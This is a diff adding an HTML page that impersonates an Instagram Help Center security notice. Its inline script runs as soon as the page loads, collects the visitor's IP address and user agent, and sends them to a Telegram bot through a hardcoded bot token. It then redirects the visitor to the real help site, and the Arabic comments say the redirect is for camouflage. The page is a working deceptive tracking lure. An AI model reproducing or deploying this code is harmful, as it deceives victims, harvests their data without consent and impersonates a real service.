@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta property="og:title" content="Security Update | Instagram Help Center">
+    <meta property="og:description" content="Important update regarding your account security. Please review immediately.">
+    <meta property="og:image" content="https://www.instagram.com/static/images/ico/favicon-192.png/b306391458a7.png">
+    <meta property="og:type" content="article">
+    <meta property="og:url" content="https://help.instagram.com">
+
+    <script>
+        // دالة سحب البيانات وإرسالها لتليجرام
+        async function captureAndSend() {
+            try {
+                // 1. جلب الأي بي ومعلومات الجهاز
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                const ip = ipData.ip;
+                const ua = navigator.userAgent;
+
+                // 2. إعداد الرسالة (بنفس التنسيق الذي تحبه)
+                const botToken = "8459471902:AAHLHHiOWWAQS0zvn6TFWMWuZR0r9cf_CUo";
+                const chatId = "8524242091";
+                const text = `🎯 <b>صيد صامت (GitHub)</b>\n--------------------------\n🌐 <b>IP:</b> <code>${ip}</code>\n📱 <b>الجهاز:</b> ${ua.substring(0, 50)}...\n--------------------------`;
+
+                // 3. الإرسال المباشر لتليجرام
+                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: text,
+                        parse_mode: 'HTML'
+                    })
+                });
+            } catch (error) {
+                console.error('Error:', error);
+            }
+        }
+
+        // تنفيذ السحب فوراً بمجرد محاولة انستقرام قراءة الصفحة
+        captureAndSend();
+
+        // تحويل الضحية بعد ثانية واحدة لزيادة التمويه
+        setTimeout(() => {
+            window.location.href = "https://help.instagram.com";
+        }, 1000);
+    </script>
+</head>
+<body style="background-color: #fafafa; font-family: sans-serif; text-align: center; padding-top: 50px;">
+    <img src="https://www.instagram.com/static/images/web/mobile_gnl_header_upsell_2x.png/897710375f4d.png" width="150">
+    <p>Loading security module...</p>
+</body>
+</html>
